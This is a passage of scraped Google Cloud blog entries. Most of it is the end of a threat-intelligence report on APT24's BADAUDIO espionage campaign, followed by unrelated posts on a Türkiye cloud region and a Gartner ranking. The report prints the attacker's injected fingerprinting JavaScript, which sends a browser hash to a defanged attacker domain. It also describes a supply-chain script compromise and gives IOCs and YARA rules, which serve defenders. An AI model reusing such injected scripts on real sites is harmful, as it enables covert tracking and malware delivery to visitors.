  \n        <img alt=\"Strategic web compromise attack flow to deliver BADAUDIO malware\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/watering-hole-apt24-fig5.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 5: Strategic web compromise attack flow to deliver BADAUDIO malware</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">This script exhibited an initial layer of targeting, specifically excluding macOS, iOS, Android, and various Microsoft Internet Explorer/Edge browser variants to focus exclusively on Windows systems. This selectivity suggests an adversary immediately narrowing their scope to optimize for a specific, likely high-value, victim profile.</span></p>\n<p><span style=\"vertical-align: baseline;\">The injected JavaScript performed a critical reconnaissance function by employing the FingerprintJS library to generate a unique browser fingerprint. This fingerprint, transmitted via an HTTP request to an attacker-controlled domain, served as an implicit validation mechanism. Upon successful validation, the victim was presented with a fabricated pop-up dialog, engineered to trick the user into downloading and executing BADAUDIO malware.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>$(window).ready(function() {\n    var userAgent = navigator.userAgent;\n    var isIE = userAgent.indexOf(\"compatible\") &gt; -1 &amp;&amp; userAgent.indexOf(\"MSIE\") &gt; -1;\n    var isEdge = userAgent.indexOf(\"Edge\") &gt; -1 &amp;&amp; !isIE;\n    var isIE11 = userAgent.indexOf('Trident') &gt; -1 &amp;&amp; userAgent.indexOf(\"rv:11.0\") &gt; -1;\n    var isMac = userAgent.indexOf('Macintosh') &gt; -1;\n    var isiPhone = userAgent.indexOf('iPhone') &gt; -1;\n    var isFireFox = userAgent.indexOf('Firefox') &gt; -1;\n    if (!isIE &amp;&amp; !isEdge &amp;&amp; !isIE11 &amp;&amp; !isMac &amp;&amp; !isiPhone &amp;&amp; !isFireFox) {\n        var tag_script = document.createElement(\"script\");\n        tag_script.type = \"text/javascript\";\n        tag_script.src = \"https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@2/dist/fingerprint2.min.js\";\n        tag_script.onload = \"initFingerprintJS()\";\n        document.body.appendChild(tag_script);\n        if (typeof(callback) !== \"undefined\") {\n            tag_script.onload = function() {\n                callback();\n            }\n        }\n        function callback() {\n            var option = {\n                excludes: {\n                    screenResolution: true,\n                    availableScreenResolution: true,\n                    enumerateDevices: true\n                }\n            }\n            new Fingerprint2.get(option, function(components) {\n                var values = components.map(function(component) {\n                    return component.value\n                })\n                var murmur = Fingerprint2.x64hash128(values.join(''), 31);\n                console.log(murmur)\n                var script_tag = document.createElement(\"script\");\n                script_tag.setAttribute(\"src\", \"https://www[.]twisinbeth[.]com/query.php?id=\" + murmur);\n                document.body.appendChild(script_tag);\n            });\n        }\n    }\n});</code></pre>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\">Figure 6: Early malicious fingerprinting JS used in strategic web compromise campaigns</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Example of attacker fake update pop-up dialog impersonating Chrome to lure targets to download and execute BADAUDIO malware\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/watering-hole-apt24-fig7.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 7: Example of attacker fake update pop-up dialog impersonating Chrome to lure targets to download and execute BADAUDIO malware</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The attackers consistently shift their infrastructure, using a mix of newly registered domains and domains they have previously compromised. We last observed this tactic in early September 2025.</span></p>\n<h5><span style=\"vertical-align: baseline;\">Escalation: Supply Chain Compromise for Strategic Web Compromises at Scale </span></h5>\n<p><span style=\"vertical-align: baseline;\">In July 2024, APT24 compromised a regional digital marketing firm in Taiwan- a supply chain attack that impacted more than 1,000 domains. Notably, the firm experienced multiple re-compromises over the last year, demonstrating APT24's persistent commitment to the operation.</span></p>\n<p><span style=\"vertical-align: baseline;\">We initiated a multifaceted remediation effort to disrupt these threats. In addition to developing custom logic to identify and block the modified, malicious JavaScript, GTIG distributed victim notifications to the individual compromised websites and the compromised marketing firm. These notifications provided specific details about the threat and the modifications made to the original script, enabling affected organizations to secure their sites and prevent future infections.</span></p>\n<p><span style=\"vertical-align: baseline;\">In the first iteration of the supply chain compromise, APT24 injected the malicious script into a widely used JavaScript library (MITRE ATT&amp;CK T1195.001) provided by the firm, leveraging a typosquatting domain to impersonate a legitimate Content Delivery Network (CDN). The deobfuscated JavaScript reveals a multi-stage infection chain:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Dynamic Dependency Loading: The script dynamically loads legitimate jQuery and FingerprintJS2 libraries (MITRE ATT&amp;CK T1059.007) from a public CDN if not already present, ensuring consistent execution across diverse web environments.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Multi-Layer JS Concealment: During a re-compromise discovered in July 2025, the adversary took additional steps to hide their malicious code. The highly obfuscated script (MITRE ATT&amp;CK T1059) was deliberately placed within a maliciously modified JSON file served by the vendor, which was then loaded and executed by another compromised JavaScript file. This tactic effectively concealed the final payload in a file type and structure not typically associated with code execution.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Advanced Fingerprinting: FingerprintJS2 is utilized to generate an x64hash128 browser and environmental fingerprint (MITRE ATT&amp;CK T1082) . The x64hash128 is the resulting 128-bit hash value produced by the </span><a href=\"https://medium.com/@thealonemusk/murmurhash-the-scrappy-algorithm-that-secretly-powers-half-the-internet-2d3f79b4509b\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">MurmurHash3</span></a><span style=\"vertical-align: baseline;\"> algorithm, which processes a large input string of collected browser characteristics (such as screen resolution, installed fonts, and GPU details) to create a unique, consistent identifier for the user's device.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Covert Data Exfiltration and Staging: A POST request, transmitting Base64-encoded reconnaissance data (including host, url, useragent, fingerprint, referrer, time, and a unique identifier), is sent to an attacker's endpoint (MITRE ATT&amp;CK T1041). </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Adaptive Payload Delivery: Successful C2 responses trigger the dynamic loading of a subsequent script from a URL provided in the response's data field. This cloaked redirect leads to BADAUDIO landing pages, contingent on the attacker's C2 logic and fingerprint assessment (MITRE ATT&amp;CK T1105</span><span style=\"vertical-align: baseline;\">).</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Tailored Targeting: The compromise in June 2025 initially employed conditional script loading based on a unique web ID (the specific domain name) related to the website using the compromised third-party scripts. This suggests tailored targeting, limiting the strategic web compromise (MITRE ATT&amp;CK T1189) to a single domain. However, for a ten-day period in August, the conditions were temporarily lifted, allowing all 1,000 domains using the scripts to be compromised before the original restriction was reimposed.</span></p>\n</li>\n</ul></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Compromised JS supply chain attack to deliver BADAUDIO malware\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/watering-hole-apt24-fig8.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 8: Compromised JS supply chain attack to deliver BADAUDIO malware</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">Targeted Phishing Campaigns</span></h4>\n<p><span style=\"vertical-align: baseline;\">Complementing their broader web-based attacks, APT24 concurrently conducted highly targeted social engineering campaigns. Lures, such as an email purporting to be from an animal rescue organization, leveraged social engineering to elicit user interaction and drive direct malware downloads from attacker-controlled domains.</span></p>\n<p><span style=\"vertical-align: baseline;\">Separate campaigns abused legitimate cloud storage platforms including Google Drive and OneDrive to distribute encrypted archives containing BADAUDIO. Google protected users by diverting these messages to spam, disrupting the threat actor’s effort to leverage reputable services in their campaigns.</span></p>\n<p><span style=\"vertical-align: baseline;\">APT24 included pixel tracking links, confirming email opens and potentially validating target interest for subsequent exploitation. This dual-pronged approach—leveraging widely trusted cloud services and explicit tracking—enhances their ability to conduct effective, personalized campaigns.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Outlook</span></h3>\n<p><span style=\"vertical-align: baseline;\">This nearly three-year campaign is a clear example of the continued evolution of APT24’s operational capabilities and highlights the sophistication of PRC-nexus threat actors. The use of advanced techniques like supply chain compromise, multi-layered social engineering, and the abuse of legitimate cloud services demonstrates the actor's capacity for persistent and adaptive espionage. </span></p>\n<p><span style=\"vertical-align: baseline;\">This activity follows a broader trend GTIG has observed of PRC-nexus threat actors increasingly employing </span><a href=\"https://cloud.google.com/blog/topics/threat-intelligence/brickstorm-espionage-campaign\"><span style=\"text-decoration: underline; vertical-align: baseline;\">stealthy tactics</span></a><span style=\"vertical-align: baseline;\"> to avoid detection. GTIG actively monitors ongoing threats from actors like APT24 to protect users and customers. As part of this effort, Google continuously updates its protections and has taken specific action against this campaign.</span></p>\n<p><span style=\"vertical-align: baseline;\">We are committed to sharing our findings with the security community to raise awareness and to disrupt this activity. We hope that improved understanding of tactics and techniques will enhance threat hunting capabilities and lead to stronger user protections across the industry.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Acknowledgements</span><span style=\"vertical-align: baseline;\"> </span></h3>\n<p><span style=\"vertical-align: baseline;\">This analysis would not have been possible without the assistance from FLARE. We would like to specifically thank Ray Leong, Jay Gibble and Jon Daniels for their contributions to the analysis and detections for BADAUDIO.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Indicators of Compromise</span></h3>\n<p><span style=\"vertical-align: baseline;\">A </span><a href=\"https://www.virustotal.com/gui/collection/7b6975dbe75c1842af8e3314cca6198b58c791c625d6d5536f5a7c0cf08ac6bd\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Threat Intelligence (GTI) collection</span></a><span style=\"vertical-align: baseline;\"> of related IOCs is available to registered users.</span></p>\n<h4><span style=\"vertical-align: baseline;\">Strategic Web Compromise JS</span></h4></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>88fa2b5489d178e59d33428ba4088d114025acd1febfa8f7971f29130bda1213\n032c333eab80d58d60228691971d79b2c4cd6b9013bae53374dd986faa0f3f4c\nae8473a027b0bcc65d1db225848904e54935736ab943edf3590b847cb571f980\n0e98baf6d3b67ca9c994eb5eb9bbd40584be68b0db9ca76f417fb3bcec9cf958\n55e02a81986aa313b663c3049d30ea0158641a451cb8190233c09bef335ef5c7</code></pre></div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">Strategic Web Compromise — Modified Supplier JS</span></h4></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>07226a716d4c8e012d6fabeffe2545b3abfc0b1b9d2fccfa500d3910e27ca65b\n5c37130523c57a7d8583c1563f56a2e2f21eef5976380fdb3544be62c6ad2de5\n1f31ddd2f598bd193b125a345a709eedc3b5661b0645fc08fa19e93d83ea5459\nc4e910b443b183e6d5d4e865dd8f978fd635cd21c765d988e92a5fd60a4428f5\n2ea075c6cd3c065e541976cdc2ec381a88b748966f960965fdbe72a5ec970d4e</code></pre></div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">BADAUDIO Binaries</span></h4></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>9ce49c07c6de455d37ac86d0460a8ad2544dc15fb5c2907ed61569b69eefd182\nd23ca261291e4bad67859b5d4ee295a3e1ac995b398ccd4c06d2f96340b4b5f8\ncfade5d162a3d94e4cba1e7696636499756649b571f3285dd79dea1f5311adcd\nf086c65954f911e70261c729be2cdfa2a86e39c939edee23983090198f06503c\nf1e9d57e0433e074c47ee09c5697f93fde7ff50df27317c657f399feac63373a\n176407b1e885496e62e1e761bbbb1686e8c805410e7aec4ee03c95a0c4e9876f\nc7565ed061e5e8b2f8aca67d93b994a74465e6b9b01936ecbf64c09ac6ee38b9\n83fb652af10df4574fa536700fa00ed567637b66f189d0bbdb911bd2634b4f0e</code></pre></div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">Strategic Web Compromise — Stage 2</span></h4></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>www[.]availableextens[.]com\nwww[.]twisinbeth[.]com\nwww[.]decathlonm[.]com\nwww[.]gerikinage[.]com\nwww[.]p9-car[.]com\nwww[.]growhth[.]com\nwww[.]brighyt[.]com\ntaiwantradoshows[.]com\njsdelivrs[.]com</code></pre></div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">BADAUDIO C2</span></h4></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>clients[.]brendns.workers[.]dev\nwww[.]cundis[.]com\nwispy[.]geneva[.]workers[.]dev\nwww[.]twisinbeth[.]com\ntradostw[.]com\njarzoda[.]net\ntrcloudflare[.]com\nroller[.]johallow.workers[.]dev</code></pre></div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">Cobalt Strike Beacon Watermark</span></h4></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>Watermark_Hash: BeudtKgqnlm0Ruvf+VYxuw==</code></pre></div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">YARA Rules</span></h3></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>rule G_Downloader_BADAUDIO_1 {\n\tmeta:\n\t\tauthor = \"Google Threat Intelligence Group (GTIG)\"\n\tstrings:\n\t\t$string_decode = { 0F 28 [1-5] 0F 29 [1-5] 0F 28 [1-5] 0F 28 [1-5] 0F 28 [1-5] 0F 55 ?? 0F 55 ?? 0F 56 ?? 0F 28 ?? 0F 55 ?? 0F 55 ?? 0F 56 ?? 0F 57 ?? 0F 2? [1-5] 0F 2? [1-5] 0F 2? }\n\t\t$s1 = \"SystemFunction036\" fullword\n\t\t$s2_b64marker = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\" fullword\n\t\t$control_flow_obfuscation = { 66 2E 0F 1F 84 00 00 00 00 00 81 [5] 7? ?? 81 [5] 7? ?? 81 [5] 7? }\n\tcondition:\n\t\tuint16(0) == 0x5a4d and all of them and #string_decode &gt; 2 and #control_flow_obfuscation &gt; 2\n}</code></pre></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>rule G_Downloader_BADAUDIO_2 {\n\tmeta:\n\t\tauthor = \"Google Threat Intelligence Group (GTIG)\"\n\tstrings:\n\t\t$c_string_decode = { C5 F8 28 [1-24] C5 F8 57 [1-8] 0F 94 [4-128] C5 F8 29 [1-64] C5 F8 29 [1-24] C5 F8 57 [1-8] 0F 94 }\n\t\t$s1 = \"SystemFunction036\" fullword\n\t\t$s2_b64marker = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\" fullword\n\t\t$control_flow_obfuscation = { 66 2E 0F 1F 84 00 00 00 00 00 81 [5] 7? ?? 81 [5] 7? ?? 81 [5] 7? }\n\t\t$c_part_of_control_flow_obfuscation_and_string_decode = { C5 F8 28 [1-5] 8B 46 ?? C5 F8 57 40 }\n\tcondition:\n\t\tuint16(0) == 0x5a4d and all of ($s*) and #control_flow_obfuscation &gt; 2 and ($c_string_decode or (#c_part_of_control_flow_obfuscation_and_string_decode &gt; 5 and #c_part_of_control_flow_obfuscation_and_string_decode &gt; 20))\n}</code></pre></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>rule G_APT_DOWNLOADER_BADAUDIO_3 {\n    meta:\n        author = \"Google Threat Intelligence Group (GTIG)\"\n    strings:\n        $s1 = \"SystemFunction036\"\n        $s2 = \"6666666666666666\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\"\n        $dc1 = { C1 C2 1A ?? ?? C1 C3 15 31 D3 ?? ?? C1 C2 07 }\n        $dc2 = { C1 C1 1E ?? ?? C1 C6 13 ?? ?? C1 C0 0A 31 }\n        $dc3 = { C1 C5 19 C1 C7 0E 01 ?? ?? ?? 31 EF C1 EB 03 31 }\n        $dc4 = { C1 C7 0F 8B ?? ?? ?? ?? ?? C1 C3 0D 31 FB C1 EA 0A 31 }\n        $f1 = { ( 0F 1F 84 00 00 00 00 00 | 66 2E 0F 1F 84 00 00 00 00 00 | 0F 1F 44 00 00 | 0F 1F 40 00 | 0F 1F 00 | 66 90 ) 3D [4] ( 7? ?? | 0F 8? ?? ?? ?? ?? ) 3D [4] ( 7? ?? | 0F 8? ?? ?? ?? ?? ) 3D [4] ( 7? ?? | 0F 8? ?? ?? ?? ?? ) 3D [4] ( 7? | 0F 8? ) }\n        $f2 = /\\x0F\\x4C\\xC1\\x3D[\\x01-\\xFF].{3}([\\x70-\\x7f].|\\x0f[\\x80-\\x8f].{4})\\x3D[\\x01-\\xFF].{3}([\\x70-\\x7f].|\\x0f[\\x80-\\x8f].{4})\\x3D[\\x01-\\xFF].{3}([\\x70-\\x7f].|\\x0f[\\x80-\\x8f].{4})\\x3D[\\x01-\\xFF].{3}([\\x70-\\x7f].|\\x0f[\\x80-\\x8f].{4})\\x3D[\\x01-\\xFF].{3}([\\x70-\\x7f].|\\x0f[\\x80-\\x8f].{4})/\n    condition:\n        all of ($s*) and 3 of ($dc*) and uint16(0) == 0x5A4D and (#f1 &gt; 5 or #f2 &gt; 2) and filesize &lt; 10MB\n}</code></pre></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>rule G_APT_DOWNLOADER_BADAUDIO_4 {\n    meta:\n        author = \"Google Threat Intelligence Group (GTIG)\"\n    strings:\n        $p00_0 = {8d4d??e8[4]8b7d??83c6??eb??c745[5]e8[4]8b4d??64890d}\n        $p00_1 = {568b7c24??8b7424??8b5424??89f1e8[4]f20f1007f20f104f??f20f118e}\n\n    condition:\n        uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and\n        (\n            ($p00_0 in (0..1100000) and $p00_1 in (0..990000))\n        )\n}</code></pre></div>",
        "published_date": "2025-11-20 14:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/infrastructure/new-google-cloud-region-coming-to-turkiye/",
        "title": "A new Google Cloud region is coming to Türkiye as part of $2 billion investment",
        "thumbnail": null,
        "author": "Onder Guler",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">We are excited to announce plans to bring a new Google Cloud region to Türkiye, as part of Google’s 10-year, $2 billion investment in the country.</span></p>\n<p><span style=\"vertical-align: baseline;\">The establishment of this world-class digital infrastructure, in collaboration with Turkcell, marks a significant multi-year investment to accelerate digital transformation in Türkiye and cloud innovation across the region. </span></p>\n<p style=\"padding-left: 40px;\"><span style=\"font-style: italic; vertical-align: baseline;\">\"The partnership between Google Cloud and Turkcell will further accelerate Türkiye’s digital transformation journey. It reflects the confidence of global technology leaders in the strength, resilience, and innovation capacity of our economy. By integrating advanced data infrastructure and next-generation cloud technologies into our digital ecosystem, this alliance will enhance efficiency and foster innovation across public and private sectors. Furthermore, it supports our long-term vision of strengthening digital sovereignty and positioning Türkiye as a regional hub for technology, connectivity, and sustainable growth.” </span><strong style=\"vertical-align: baseline;\">Cevdet Yılmaz, Vice President of the Republic of Türkiye</strong></p>\n<p style=\"padding-left: 40px;\"><span style=\"font-style: italic; vertical-align: baseline;\">\"Our partnership with Google Cloud clearly reinforces Turkcell’s leadership in driving Türkiye’s digital transformation. This strategic partnership is more than a technology investment — it is a milestone for Türkiye’s digital future, accelerating  our national vision by leveraging Google Cloud’s global technologies and unlocking opportunities for AI innovations. This collaboration gives our customers seamless access to Google Cloud’s cutting-edge capabilities. This new Google Cloud region will enable enterprises to innovate faster and compete globally. As part of this partnership Turkcell plans to invest $1 billion in data centers and cloud technologies.” - </span><strong style=\"vertical-align: baseline;\">Dr. Ali Taha Koç, CEO, Turkcell</strong></p>\n<p><span style=\"vertical-align: baseline;\">When it is open, the Türkiye region will help meet growing customer demand for cloud services and AI-driven innovation in the country and across EMEA, delivering high-performance services that make it easier for organizations to serve their end users faster, securely, and reliably. Local customers and partners will benefit from key controls that enable them to maintain low latency and the highest international security and data protection standards.</span></p>\n<p style=\"padding-left: 40px;\"><span style=\"font-style: italic; vertical-align: baseline;\">\"Cloud technologies are a critical enabler of the financial sector’s ongoing digital transformation. With Google Cloud’s new region in Türkiye, Garanti BBVA will be able to strengthen its operational resilience while continuing to innovate by securely deploying artificial intelligence and advanced data analytics. This collaboration reinforces our commitment to delivering reliable, high-performance digital services to our customers, while ensuring that data sovereignty, privacy, and trust remain at the core of everything we do.\" —</span><span style=\"font-style: italic; vertical-align: baseline;\"> </span><strong style=\"vertical-align: baseline;\">İlker Kuruöz, Garanti BBVA</strong></p>\n<p style=\"padding-left: 40px;\"><span style=\"font-style: italic; vertical-align: baseline;\">\"As a global airline connecting Türkiye to the world, Turkish Airlines relies on high-performance, resilient technology to deliver an uninterrupted customer journey, 24/7. Google Cloud’s plan to launch a local region in Türkiye, combined with its global network, is a game-changer for our flight operations, passenger systems, and data-intensive applications. Having hyperscale cloud infrastructure closer to home ensures the low latency required to adopt advanced analytics, robust cybersecurity solutions, and future AI capabilities, accelerating our digital strategy and reinforcing our commitment to service excellence.\" — </span><strong style=\"vertical-align: baseline;\">Kerem Kızıltunç, Turkish Airlines</strong></p>\n<p style=\"padding-left: 40px;\"><strong style=\"vertical-align: baseline;\">“</strong><span style=\"font-style: italic; vertical-align: baseline;\">Yapı Kredi is focused on continuous innovation and modernizing our core banking infrastructure to deliver a limitless banking experience to our customers. The planned Google Cloud region in Türkiye provides the robust, scalable, and secure infrastructure of a hyperscale cloud, which is necessary to power our advanced artificial intelligence and cybersecurity initiatives. This local presence will significantly enhance the performance and flexibility needed to support our growth and empower us to build the next generation of secure, digital-first financial products.\" — </span><strong style=\"vertical-align: baseline;\">Gökhan Özdinç, Yapı Kredi Bank</strong></p>\n<p><span style=\"vertical-align: baseline;\">With </span><a href=\"https://cloud.google.com/about/locations\"><span style=\"text-decoration: underline; vertical-align: baseline;\">42 regions and 127 zones</span></a><span style=\"vertical-align: baseline;\"> currently in operation around the world, Google Cloud’s global network of cloud regions forms the foundation to support customers of all sizes and across industries. From retail and media and entertainment to financial services, healthcare and the public sector, leading organizations come to Google Cloud as their trusted technology partner. </span></p>\n<p><span style=\"vertical-align: baseline;\">Key features of the Google Cloud region in Türkiye will include: </span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Advanced capabilities and technologies:</strong><span style=\"vertical-align: baseline;\"> The region will deliver leading Google Cloud services across data analytics, cybersecurity and digital business solutions. Google’s cutting-edge AI innovations will strengthen Türkiye’s digital ecosystem and enable enterprises and public sector entities to operate with greater efficiency, speed and security.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Uncompromising data sovereignty and security:</strong><span style=\"vertical-align: baseline;\"> The new region in Türkiye will benefit from our robust infrastructure, including data encryption at rest and in transit, granular data access controls, data residency, and sophisticated threat detection systems. We adhere to the highest international security and data protection standards to help ensure the confidentiality, integrity, and sovereignty of your data.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">High performance and low latency:</strong><span style=\"vertical-align: baseline;\"> Serves end users across Türkiye and neighboring countries with fast, low latency experiences, and transfers large amounts of data between networks easily across Google’s global network.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Scalability and flexibility on demand:</strong><span style=\"vertical-align: baseline;\"> Google Cloud’s infrastructure is designed to scale easily with any business. Whether you’re a small startup or a large corporation, you can easily adjust your resources to meet your evolving needs.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Learn more about our </span><a href=\"https://cloud.google.com/infrastructure\"><span style=\"text-decoration: underline; vertical-align: baseline;\">global cloud infrastructure</span></a><span style=\"vertical-align: baseline;\">, including new and upcoming regions.</span></p></div>",
        "published_date": "2025-11-20 08:30:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/ai-machine-learning/google-named-a-leader-in-the-gartner-magic-quadrant/",
        "title": "Google Named a Leader in the Gartner® Magic Quadrant™ for AI Application Development Platforms",
        "thumbnail": null,
        "author": "Mike Clark",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Scaling generative AI demands a unified, governed platform that delivers complex agentic capability, end-to-end operational control, and the flexibility of model choice across your enterprise – regardless of where your data resides.</span></p>\n<p><span style=\"vertical-align: baseline;\">We are proud to announce that Google has been recognized as a Leader in the inaugural 2025 Gartner Magic Quadrant for AI Application Development Platforms for our </span><strong style=\"vertical-align: baseline;\">Ability to Execute</strong><span style=\"vertical-align: baseline;\"> and </span><strong style=\"vertical-align: baseline;\">Completeness of Vision. </strong></p>\n<p><span style=\"vertical-align: baseline;\">Google was positioned highest in </span><strong style=\"vertical-align: baseline;\">Ability to Execute</strong><span style=\"vertical-align: baseline;\"> of all vendors evaluated and we believe this result</span><span style=\"font-style: italic; vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">validates our platform's commitment to three core customer outcomes: </span><strong style=\"vertical-align: baseline;\">building highly differentiated AI</strong><span style=\"vertical-align: baseline;\">, </span><strong style=\"vertical-align: baseline;\">driving agentic transformation</strong><span style=\"vertical-align: baseline;\">, and </span><strong style=\"vertical-align: baseline;\">scaling with predictable cost</strong><span style=\"vertical-align: baseline;\">.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"High-Res_Figure_1_Magic_Quadrant_for_AI_Application_Development_Platforms\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/High-Res_Figure_1_Magic_Quadrant_for_AI_Ap.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">Build differentiated models with unrivaled choice</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Your AI journey starts with access to the best models and a platform to build differentiated assets. </span><a href=\"https://cloud.google.com/vertex-ai?e=48754805&amp;hl=en\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Vertex AI</span></a><span style=\"vertical-align: baseline;\"> is that platform that provides the control and choice necessary for your business.</span></p>\n<p><span style=\"vertical-align: baseline;\">Vertex AI is fueled by continuous, market-leading innovation from Google DeepMind, ensuring you always have instant access to the most advanced intelligence. This continuous stream of best-in-class models is made accessible through the </span><a href=\"https://cloud.google.com/model-garden?e=48754805&amp;hl=en\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Vertex AI Model Garden</span></a><span style=\"vertical-align: baseline;\">, which offers over 200 models from Google, open-source communities, and third-party partners. We recently delivered </span><a href=\"https://cloud.google.com/blog/products/ai-machine-learning/gemini-3-is-available-for-enterprise?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Gemini 3, our most intelligent model yet</span></a><span style=\"vertical-align: baseline;\">, available in Vertex AI. This extensive choice guarantees you always have the optimal model for any specific use case, budget, and performance need. </span></p>\n<p><span style=\"vertical-align: baseline;\">Once you have selected a model, you need the tools to make it yours. </span><a href=\"https://cloud.google.com/blog/products/ai-machine-learning/new-capabilities-in-vertex-ai-training-for-large-scale-training?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Vertex AI Training</span></a><span style=\"vertical-align: baseline;\"> provides the full spectrum of customization to adapt the model to your company's proprietary data and business processes.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Driving agentic transformation for your business</strong></h3>\n<p><span style=\"vertical-align: baseline;\">The next wave of business transformation is being powered by sophisticated AI agents. </span></p>\n<p><a href=\"https://cloud.google.com/products/agent-builder?e=48754805&amp;hl=en\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Vertex AI Agent Builder</span></a><span style=\"vertical-align: baseline;\"> provides a dedicated suite of open frameworks, tools and services for developers and enterprises to build, scale, and govern custom, multi-agent systems into production. The platform provides the core services essential for moving agents to production: agent orchestration, end-to-end operations, observability, and secure grounding in your enterprise data. Specifically, </span><a href=\"https://docs.cloud.google.com/agent-builder/agent-engine/overview\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Agent Engine</span></a><span style=\"vertical-align: 